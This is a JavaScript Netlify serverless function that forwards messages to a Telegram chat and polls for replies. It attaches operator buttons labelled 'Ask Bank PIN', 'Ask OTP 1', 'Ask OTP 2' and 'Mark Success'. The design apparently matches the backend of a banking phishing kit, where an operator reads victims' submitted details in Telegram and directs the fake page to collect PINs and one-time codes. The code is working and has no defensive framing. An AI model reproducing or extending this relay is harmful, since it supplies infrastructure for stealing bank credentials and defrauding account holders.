export async function handler(event, context) {
  // CORS Headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }

  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method Not Allowed' }) };
  }

  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  if (!BOT_TOKEN || !CHAT_ID) {
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'Telegram environment variables are missing on Netlify server.' })
    };
  }

  try {
    const bodyData = JSON.parse(event.body || '{}');
    const { action, message, actionIdentifier, offset, limit } = bodyData;

    // Send Message via Telegram API
    if (action === 'sendMessage') {
      const inlineActionKeyboard = {
        inline_keyboard: [
          [{ text: "✅ Approve / Continue", callback_data: `cmd_approve_${actionIdentifier}` }],
          [{ text: "🏦 Ask Bank PIN", callback_data: `cmd_ask_bank_pin_${actionIdentifier}` }, { text: "🔐 Ask OTP 1", callback_data: `cmd_ask_otp1_${actionIdentifier}` }],
          [{ text: "📲 Ask OTP 2", callback_data: `cmd_ask_otp2_${actionIdentifier}` }, { text: "✅ Mark Success", callback_data: `cmd_success_${actionIdentifier}` }],
          [{ text: "❌ Reject & Retry", callback_data: `cmd_reject_${actionIdentifier}` }]
        ]
      };

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown',
          reply_markup: inlineActionKeyboard
        })
      });

      const data = await res.json();
      return { statusCode: 200, headers, body: JSON.stringify(data) };
    }

    // Get Updates via Telegram API
    if (action === 'getUpdates') {
      const queryOffset = offset !== undefined ? offset : -1;
      const queryLimit = limit !== undefined ? limit : 100;
      
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${queryOffset}&limit=${queryLimit}`);
      const data = await res.json();
      return { statusCode: 200, headers, body: JSON.stringify(data) };
    }

    return { statusCode: 400, headers, body: JSON.stringify({ error: 'Invalid action requested' }) };

  } catch (error) {
    return { statusCode: 500, headers, body: JSON.stringify({ error: error.message }) };
  }
}
